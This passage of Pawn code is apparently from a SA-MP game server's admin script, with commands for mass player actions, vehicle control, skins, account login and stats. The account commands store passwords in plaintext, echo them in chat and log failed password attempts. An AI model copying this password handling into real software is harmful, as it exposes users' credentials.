	if(PlayerInfo[playerid][Helper] == 1 || PlayerInfo[playerid][Level] >= 1) {
 		if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: JikyBot: Usage changed to ![TEXT]");
		new string[128]; format(string, sizeof(string), "Testerchat.Chat: %s: %s", PlayerName2(playerid), params[0]);
		return SendClientMessage(playerid, red, "JikyBot: Usage changed to ![TEXT]");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be Server Tester to use this command");
}

CMD:slapall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"SLAPALL");
		new Float:x, Float:y, Float:z;
	   	foreach(Player, i) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1190,0.0,0.0,0.0); GetPlayerPos(i,x,y,z);	SetPlayerPos(i,x,y,z+4);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has slapped all players", pName(playerid) );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:explodeall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"EXPLODEALL");
		new Float:x, Float:y, Float:z;
	   	foreach(Player, i) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1190,0.0,0.0,0.0); GetPlayerPos(i,x,y,z);	CreateExplosion(x, y , z, 7, 10.0);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has exploded all players", pName(playerid) );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:disarmall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"DISARMALL");
	   	foreach(Player, i) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); ResetPlayerWeapons(i);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has disarmed all players", pName(playerid) );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:ejectall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
    	CMDMessageToAdmins(playerid,"EJECTALL");
        new Float:x, Float:y, Float:z;
	   	foreach(Player, i) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
			    if(IsPlayerInAnyVehicle(i)) {
					PlayerPlaySound(i,1057,0.0,0.0,0.0); GetPlayerPos(i,x,y,z); SetPlayerPos(i,x,y,z+3);
				}
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has ejected all players", pName(playerid) );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
//-------------==== Set All Commands ====-------------//

CMD:setallwanted(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 5) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setallwanted [wanted level]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"SETALLWANTED");
		foreach(Player, i) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerWantedLevel(i,var);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has set all players wanted level to '%d'", pName(playerid), var );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setallweather(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setallweather [weather ID]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"SETALLWEATHER");
		foreach(Player, i) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerWeather(i, var);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has set all players weather to '%d'", pName(playerid), var );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setalltime(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setalltime [hour]");
		new var = strval(params), string[128];
		if(var > 24) return SendClientMessage(playerid, red, "JikyBot: Invalid hour");
       	CMDMessageToAdmins(playerid,"SETALLTIME");
		foreach(Player, i) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerTime(i, var, 0);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has set all players time to '%d:00'", pName(playerid), var );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setallworld(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setallworld [virtual world]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"SETALLWORLD");
		foreach(Player, i) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerVirtualWorld(i,var);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has set all players virtual worlds to '%d'", pName(playerid), var );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setallscore(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 5) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setallscore [score]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"SETALLSCORE");
		foreach(Player, i) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerScore(i,var);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has set all players scores to '%d'", pName(playerid), var );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setallcash(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setallcash [Amount]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"SETALLCASH");
		foreach(Player, i) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				ResetPlayerMoney(i);
				GivePlayerMoney(i,var);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has set all players cash to '$%d'", pName(playerid), var );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:giveallcash(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/giveallcash [Amount]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"GIVEALLCASH");
		foreach(Player, i) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				GivePlayerMoney(i,var);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has given all players '$%d'", pName(playerid), var );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:pay(playerid, params[])
{
	new giveplayerid, amount;
	if (sscanf(params, "ud", giveplayerid, amount)) SendClientMessage(playerid, 0xFF0000AA, "JikyBot: Usage:/pay [playerid/partname] [amount]");
	else if (giveplayerid == INVALID_PLAYER_ID) SendClientMessage(playerid, 0xFF0000AA, "Player not found");
	new Float:gX, Float:gY, Float:gZ;
  	GetPlayerPos(playerid, gX, gY, gZ);
	if(!IsPlayerInRangeOfPoint(giveplayerid, 5.0, gX, gY, gZ) )
	{
    	SendClientMessage(playerid, red, "Player has to be near you!");
		return 1;
	}
	if(GetPlayerMoney(playerid) >= amount)
	{
	    if(amount <= 100000 && amount > 0 && playerid != giveplayerid)
		{
			GivePlayerMoney(giveplayerid, amount);
			GivePlayerMoney(playerid, -amount);
            new string[128];
		    format(string,sizeof(string),"%s has given you '$%d'", pName(playerid), amount );
		    SendClientMessage(giveplayerid, green, string);
		    format(string, sizeof(string),"You gave %s $%d", pName(giveplayerid), amount );
		    SendClientMessage(playerid, green, string);
     		return 1;
		}
		else return SendClientMessage(playerid, 0xFF0000FF, "You can only send a maximum 100000 at once!");
	}
	else return SendClientMessage(playerid, 0xFF0000FF, "You do not have enough cash to send!");
}
CMD:givemoney(playerid,params[])
{
	return cmd_gm(playerid, params);
}


CMD:giveallweapon(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4) {
    new Weap, ammo, name[128], string[128];
        if(sscanf(params,"ii",Weap, ammo)) return SendClientMessage(playerid,red,"JikyBot: Usage:/giveallweapon [weapon name] [ammo]");
        if(Weap == 38 || Weap == 36) return SendClientMessage(playerid,red,"You Can't Give Those Weapons!");
		CMDMessageToAdmins(playerid,"GIVEALLWEAPON");
       	foreach(Player, i) {
		if(IsPlayerConnected(i))
        {
            GivePlayerWeapon(i,Weap,ammo) && PlayerPlaySound(i, 1057,0.0,0.0,0.0);
        }
        }
        format(string,sizeof(string),"Administrator %s has given all players weapon: %d with %d ammo",name,Weap,ammo);
        SendClientMessageToAll(blue,string);
    }
    else SendClientMessage(playerid,red,"You are not a high enough level to use this command");
    return 1;
}
//================================[ Menu Commands ]=============================

#if defined USE_MENUS

CMD:lmenu(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 2) {
    TogglePlayerControllable(playerid,false);
        if(IsPlayerInAnyVehicle(playerid)) {
		return ShowMenuForPlayer(LMainMenu,playerid);
        } else return ShowMenuForPlayer(LMainMenu,playerid);
    } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:ltele(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 2) {
        if(IsPlayerInAnyVehicle(playerid)) {
        TogglePlayerControllable(playerid,false); return ShowMenuForPlayer(LTele,playerid);
        } else return ShowMenuForPlayer(LTele,playerid);
    } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:lweather(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 3) {
        if(IsPlayerInAnyVehicle(playerid)) {
        TogglePlayerControllable(playerid,false); return ShowMenuForPlayer(LWeather,playerid);
        } else return ShowMenuForPlayer(LWeather,playerid);
    } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:ltime(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 3) {
        if(IsPlayerInAnyVehicle(playerid)) {
        TogglePlayerControllable(playerid,false); return ShowMenuForPlayer(LTime,playerid);
        } else return ShowMenuForPlayer(LTime,playerid);
    } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:sv( playerid, params[ ] )
{
  if(PlayerInfo[playerid][Level] >= 1)
  {
    static
        vehID
    ;

    if ( sscanf( params, "i",  vehID ) )
        return SendClientMessage( playerid, red, "SYNTAX: /sv < vehID >" );

    if ( vehID == INVALID_VEHICLE_ID )
        return SendClientMessage( playerid, red, "JikyBot: Invalid vehicle ID." );

    SetVehicleToRespawn( vehID );
    CMDMessageToAdmins(playerid,"SV");

    SendClientMessage( playerid, red, "Vehicle has been respawned succesfully." );
  }
  return 1;
}
CMD:dv(playerid, params[])
{
if(PlayerInfo[playerid][Level] >= 6) {
static
vehID
;
if ( sscanf( params, "i",  vehID ) )
return SendClientMessage( playerid, red, "SYNTAX: /dv < vehID >" );

if ( vehID == INVALID_VEHICLE_ID )
return SendClientMessage( playerid, red, "JikyBot: Invalid vehicle ID." );

DestroyVehicle(vehID);
CMDMessageToAdmins(playerid,"DV");
}
return 1;
}
CMD:rac(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][Level] >= 4)
		{
				new string[128];
				format(string,sizeof(string),"Administrator %s has respawn all vehicles.",pName(playerid));
                SendClientMessageToAll(blue,string);
				forveh(cars)
				{
                	SetVehicleToRespawn(cars);
				}
		}
	  else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
CMD:cm(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 2) {
        if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red,"JikyBot: You already have a car.");
        else { ShowMenuForPlayer(LCars,playerid); return TogglePlayerControllable(playerid,false);  }
    } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:ltmenu(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 2) {
        if(IsPlayerInAnyVehicle(playerid)) {
		new LVehicleID = GetPlayerVehicleID(playerid), LModel = GetVehicleModel(LVehicleID);
        switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449: return SendClientMessage(playerid,red,"JikyBot: You can not tune this vehicle!"); }
        TogglePlayerControllable(playerid,false); return ShowMenuForPlayer(LTuneMenu,playerid);
        } else return SendClientMessage(playerid,red,"JikyBot: You do not have a vehicle to tune");
    } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:lweapons(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 3) {
        if(IsPlayerInAnyVehicle(playerid)) {
        TogglePlayerControllable(playerid,false); return ShowMenuForPlayer(XWeapons,playerid);
        } else return ShowMenuForPlayer(XWeapons,playerid);
    } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:lvehicle(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 2) {
 		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red,"JikyBot: You already have a car.");
        else { ShowMenuForPlayer(LVehicles,playerid); return TogglePlayerControllable(playerid,false);  }
    } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

#endif

//----------------------===== Place & Skin Saving =====-------------------------
CMD:gotoplace(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1 && PlayerInfo[playerid][Level] >= 1)	{
	    if (dUserINT(PlayerName2(playerid)).("x")!=0) {
		    PutAtPos(playerid);
			SetPlayerVirtualWorld(playerid, (dUserINT(PlayerName2(playerid)).("world")) );
			return SendClientMessage(playerid,yellow,"You have successfully teleported to your saved place");
		} else return SendClientMessage(playerid,red,"JikyBot: You must save a place before you can teleport to it");
	} else return SendClientMessage(playerid,red, "JikyBot: You must be an administrator to use this command");
}

CMD:saveplace(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1 && PlayerInfo[playerid][Level] >= 1)	{
		new Float:x,Float:y,Float:z, interior;
		GetPlayerPos(playerid,x,y,z);	interior = GetPlayerInterior(playerid);
		dUserSetINT(PlayerName2(playerid)).("x",floatround(x));
		dUserSetINT(PlayerName2(playerid)).("y",floatround(y));
		dUserSetINT(PlayerName2(playerid)).("z",floatround(z));
		dUserSetINT(PlayerName2(playerid)).("interior",interior);
		dUserSetINT(PlayerName2(playerid)).("world", (GetPlayerVirtualWorld(playerid)) );
		return SendClientMessage(playerid,yellow,"You have successfully saved these coordinates");
	} else return SendClientMessage(playerid,red, "JikyBot: You must be an administrator to use this command");
}

CMD:saveskin(playerid,params[]) {
 	if(PlayerInfo[playerid][Level] >= 1 && PlayerInfo[playerid][LoggedIn] == 1) {
		if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/saveskin [skinid]");
		new string[128], SkinID = strval(params);
		if((SkinID == 0)||(SkinID == 7)||(SkinID >= 9 && SkinID <= 41)||(SkinID >= 43 && SkinID <= 64)||(SkinID >= 66 && SkinID <= 73)||(SkinID >= 75 && SkinID <= 85)||(SkinID >= 87 && SkinID <= 118)||(SkinID >= 120 && SkinID <= 148)||(SkinID >= 150 && SkinID <= 207)||(SkinID >= 209 && SkinID <= 264)||(SkinID >= 274 && SkinID <= 288)||(SkinID >= 290 && SkinID <= 299))
		{
 			dUserSetINT(PlayerName2(playerid)).("FavSkin",SkinID);
		 	format(string, sizeof(string), "You have successfully saved this skin (ID %d)",SkinID);
		 	SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,yellow,"Type: /useskin to use this skin when you spawn or /dontuseskin to stop using skin");
			dUserSetINT(PlayerName2(playerid)).("UseSkin",1);
		 	return CMDMessageToAdmins(playerid,"SAVESKIN");
		} else return SendClientMessage(playerid, green, "JikyBot: Invalid Skin ID");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be an administrator to use this command");
}

CMD:useskin(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 1 && PlayerInfo[playerid][LoggedIn] == 1) {
	    dUserSetINT(PlayerName2(playerid)).("UseSkin",1);
    	SetPlayerSkin(playerid,dUserINT(PlayerName2(playerid)).("FavSkin"));
		return SendClientMessage(playerid,yellow,"Skin now in use");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be an administrator to use this command");
}

CMD:dontuseskin(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 1 && PlayerInfo[playerid][LoggedIn] == 1) {
	    dUserSetINT(PlayerName2(playerid)).("UseSkin",0);
		return SendClientMessage(playerid,yellow,"Skin will no longer be used");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be an administrator to use this command");
}

//====================== [REGISTER  &  LOGIN] ==================================
#if defined USE_AREGISTER

CMD:aregister(playerid,params[])
{
    if (PlayerInfo[playerid][LoggedIn] == 1) return SendClientMessage(playerid,red,"ACCOUNT: You are already registered and logged in.");
    if (udb_Exists(PlayerName2(playerid))) return SendClientMessage(playerid,red,"ACCOUNT: This account already exists, please use '/alogin [password]'.");
    if (strlen(params) == 0) return SendClientMessage(playerid,red,"ACCOUNT: Correct JikyBot: Usage:'/aregister [password]'");
    if (strlen(params) < 4 || strlen(params) > 20) return SendClientMessage(playerid,red,"ACCOUNT: Password length must be greater than three characters");
    if (udb_Create(PlayerName2(playerid),params))
	{
    	new file[256],name[MAX_PLAYER_NAME], tmp3[100];
    	new strdate[20], year,month,day;	getdate(year, month, day);
		GetPlayerName(playerid,name,sizeof(name)); format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(name));
     	GetPlayerIp(playerid,tmp3,100);	dini_Set(file,"ip",tmp3);
//    	dini_Set(file,"password",params);
	    dUserSetINT(PlayerName2(playerid)).("registered",1);
   		format(strdate, sizeof(strdate), "%d/%d/%d",day,month,year);
		dini_Set(file,"RegisteredDate",strdate);
		dUserSetINT(PlayerName2(playerid)).("loggedin",1);
		dUserSetINT(PlayerName2(playerid)).("banned",0);
		dUserSetINT(PlayerName2(playerid)).("level",0);
	    dUserSetINT(PlayerName2(playerid)).("LastOn",0);
    	dUserSetINT(PlayerName2(playerid)).("money",0);
    	dUserSetINT(PlayerName2(playerid)).("kills",0);
	   	dUserSetINT(PlayerName2(playerid)).("deaths",0);
	    PlayerInfo[playerid][LoggedIn] = 1;
	    PlayerInfo[playerid][Registered] = 1;
	    SendClientMessage(playerid, green, "ACCOUNT: You are now registered, and have been automaticaly logged in");
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return 1;
	}
    return 1;
}

CMD:alogin(playerid,params[])
{
    if (PlayerInfo[playerid][LoggedIn] == 1) return SendClientMessage(playerid,red,"ACCOUNT: You are already logged in.");
    if (!udb_Exists(PlayerName2(playerid))) return SendClientMessage(playerid,red,"ACCOUNT: Account doesn't exist, please use '/aregister [password]'.");
    if (strlen(params)==0) return SendClientMessage(playerid,red,"ACCOUNT: Correct JikyBot: Usage:'/alogin [password]'");
    if (udb_CheckLogin(PlayerName2(playerid),params))
	{
	   	new file[256], tmp3[100], string[128];
	   	format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(PlayerName2(playerid)) );
   		GetPlayerIp(playerid,tmp3,100);
	   	dini_Set(file,"ip",tmp3);
		LoginPlayer(playerid);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		if(PlayerInfo[playerid][Level] > 0) {
			format(string,sizeof(string),"ACCOUNT: Successfully Logged In. (Level %d)", PlayerInfo[playerid][Level] );
			return SendClientMessage(playerid,green,string);
       	} else return SendClientMessage(playerid,green,"ACCOUNT: Successfully Logged In");
	}
	else {
		PlayerInfo[playerid][FailLogin]++;
		printf("LOGIN: %s has failed to login, Wrong password (%s) Attempt (%d)", PlayerName2(playerid), params, PlayerInfo[playerid][FailLogin] );
		if(PlayerInfo[playerid][FailLogin] == MAX_FAIL_LOGINS)
		{
			new string[128]; format(string, sizeof(string), "%s has been kicked (Failed Logins)", PlayerName2(playerid) );
			SendClientMessageToAll(grey, string); print(string);
			Kick(playerid);
		}
		return SendClientMessage(playerid,red,"ACCOUNT: Login failed! Incorrect Password");
	}
}

CMD:achangepass(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1)	{
		if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/achangepass [new password]");
		if(strlen(params) < 4) return SendClientMessage(playerid,red,"ACCOUNT: Incorrect password length");
		new string[128];
		dUserSetINT(PlayerName2(playerid)).("password_hash",udb_hash(params) );
		dUserSet(PlayerName2(playerid)).("Password",params);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
        format(string, sizeof(string),"ACCOUNT: You have successfully changed your password to [ %s ]",params);
		return SendClientMessage(playerid,yellow,string);
	} else return SendClientMessage(playerid,red, "JikyBot: You must have an account to use this command");
}

CMD:asetpass(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3) {
	    new string[128], tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/asetpass [playername] [new password]");
		if(strlen(tmp2) < 4 || strlen(tmp2) > MAX_PLAYER_NAME) return SendClientMessage(playerid,red,"JikyBot: Incorrect password length");
		if(udb_Exists(tmp)) {
			dUserSetINT(tmp).("password_hash", udb_hash(tmp2));
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
    	    format(string, sizeof(string),"ACCOUNT: You have successfully set \"%s's\" account password to \"%s\"", tmp, tmp2);
			return SendClientMessage(playerid,yellow,string);
		} else return SendClientMessage(playerid,red, "JikyBot: This player doesnt have an account");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
#if defined USE_STATS
CMD:aresetstats(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1)	{
		// save as backup
	   	dUserSetINT(PlayerName2(playerid)).("oldkills",PlayerInfo[playerid][Kills]);
	   	dUserSetINT(PlayerName2(playerid)).("olddeaths",PlayerInfo[playerid][Deaths]);
		// stats reset
		PlayerInfo[playerid][Kills] = 0;
		PlayerInfo[playerid][Deaths] = 0;
		dUserSetINT(PlayerName2(playerid)).("kills",PlayerInfo[playerid][Kills]);
	   	dUserSetINT(PlayerName2(playerid)).("deaths",PlayerInfo[playerid][Deaths]);
        PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return SendClientMessage(playerid,yellow,"ACCOUNT: You have successfully reset your stats. Your kills and deaths are: 0");
	} else return SendClientMessage(playerid,red, "JikyBot: You must have an account to use this command");
}

CMD:2ndstats(playerid,params[]) {
	new string[128], pDeaths, player1, h, m, s;
	if(isnull(params)) player1 = playerid;
	else player1 = strval(params);
	if(IsPlayerConnected(player1)) {
	    new Float:x, Float:y, Float:z, Float:health, Float:armor;
			 GetPlayerPos(playerid, x,y,z); GetPlayerHealth(playerid, health);
     GetPlayerArmour(playerid, armor);
	    TotalGameTime(player1, h, m, s);
	    PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0);
 		if(PlayerInfo[player1][Deaths] == 0) pDeaths = 1; else pDeaths = PlayerInfo[player1][Deaths];
 		format(string, sizeof(string), "| %s's Stats:  Kills: %d | Deaths: %d | Ratio: %0.2f | Money: $%d | Time: %d hrs %d mins %d secs |Score: %d | Health:%d | Armour:%d",PlayerName2(player1), PlayerInfo[player1][Kills], PlayerInfo[player1][Deaths], Float:PlayerInfo[player1][Kills]/Float:pDeaths,GetPlayerMoney(player1), h, m, s, GetPlayerScore(playerid), floatround(health),armor);
		return SendClientMessage(playerid, green, string);
	} else return SendClientMessage(playerid, red, "Player Not Connected!");
}
#endif

#else

#define DIALOG_STATS            44
CMD:stats(playerid, params[])
{
    new str2[956];
	new str[956], pDeaths, player1, h, m, s,playername[MAX_PLAYER_NAME];
	if(isnull(params)) player1 = playerid;
	else player1 = strval(params);
    if(IsPlayerConnected(player1)) {
        TotalGameTime(player1, h, m, s);
        GetPlayerName(player1, playername, sizeof(playername));
 	    if(PlayerInfo[player1][Deaths] == 0) pDeaths = 1; else pDeaths = PlayerInfo[player1][Deaths];
	    format(str, sizeof str, ""cred"Name: "cwhite"%s\n\n "cred"Scores: "cwhite"%d\n\n "cred"Money: "cwhite"$%d\n\n"cred" Kills: "cwhite"%d\n\n "cred"Deaths: "cwhite"%d\n\n "cred"K/D Ratio: "cwhite"%0.2f \n\n",  PlayerName2(player1), GetPlayerScore(player1), GetPlayerMoney(player1), PlayerInfo[player1][Kills], PlayerInfo[player1][Deaths], Float:PlayerInfo[player1][Kills]/Float:pDeaths);
        strcat(str2, str);
        format(str, sizeof str, ""cred"Admin Level: "cwhite"%d\n\n "cred"Operator: "cwhite"%s\n\n"cred"Team: "cwhite"%s\n\n "cred"Class: "cwhite"%s\n\n", PlayerInfo[player1][Level], PlayerInfo[player1][Helper] ? ("Yes") : ("No"), GetTeamName(player1), GetClass(player1));
	    strcat(str2, str);
	    format(str, sizeof str, ""cred"TimePlayed: "cwhite"[%d] hrs [%d] mins [%d] secs", h, m, s);
	    strcat(str2, str);

	ShowPlayerDialog(playerid, DIALOG_STATS, DIALOG_STYLE_MSGBOX, ""cblue"Real World At War 2 - Stats", str2, "Close", "");
    } else return SendClientMessage(playerid, red, "Player Is Not Connected!");
	return 1;
}


CMD:rules(playerid, params[])
{
            new fstr[980];
			strcat(fstr, ""corange"COD_RWW2_Rules:\n\n");
			strcat(fstr, " Do not shout hackers name on main chat, /report!\n");
			strcat(fstr, " Do not Advertise other server in the server, You will get banned by the Anti-Cheat\n");
			strcat(fstr, " Stop asking for promotion or for being admin/vip\n");
			strcat(fstr, " Do not spam on the chat or in the PM!\n");
			strcat(fstr, " Hacks/Cheats is not allowed else, Banned or Warn or Kick!\n");
			strcat(fstr, " Using Mods is allowed, But abusing it will cause you banned or warn or kick!\n");
			strcat(fstr, ""cblue" C-BUG or Sawn-off Scroll is not Allowed\n\n");
			strcat(fstr, ""cred"Respect Our Scripter: Perfect_Boy\n\n");
			strcat(fstr, ""cgreen"Don't Use Any Kind of bugs\n");
			strcat(fstr, ""cgreen"Respect All Players/Admins\n");
			strcat(fstr, ""cgreen"Don't Score Farm\n");
			strcat(fstr, ""cgreen"Don't Park Your Car On Other Players\n");
			strcat(fstr, ""cgreen"Don't Spawn Kill\n");
			strcat(fstr, ""cgreen"Don't Ask For Score or cash..etc from admins\n");
			strcat(fstr, ""cgreen"Don't Team Attack/Kill\n");
			strcat(fstr, ""cgreen"Don't Team Attack Admin on Duty\n");
			strcat(fstr, ""cgreen"Don't Team Car Jack\n");
            strcat(fstr, ""cyellow"Visit Our Website: xenon-extreme.com and be a part of our Community!\n\n");
			strcat(fstr, ""cgreen"Real World At War 2 V10.9.6 NEW by Perfect_Boy. All rights reserved. \nCopyright Xenon Pro Gaming.\n");
			ShowPlayerDialog(playerid, 805, DIALOG_STYLE_MSGBOX, ""cgreen"Real World At War 2™ Rules", fstr, "Okay", "Cancel");
	return 1;
}


#if defined USE_STATS
CMD:stats2(playerid,params[]) {
	new string[100], pDeaths, player1,playername[MAX_PLAYER_NAME];
	if(isnull(params)) player1 = playerid;
	else player1 = strval(params);

	if(IsPlayerConnected(player1)) {
	    GetPlayerName(player1, playername, sizeof(playername));
 		if(PlayerInfo[player1][Deaths] == 0) pDeaths = 1; else pDeaths = PlayerInfo[player1][Deaths];
 		new str[120], str1[100];
 		format(str, sizeof(str),"%s's Stats", PlayerName2(player1));
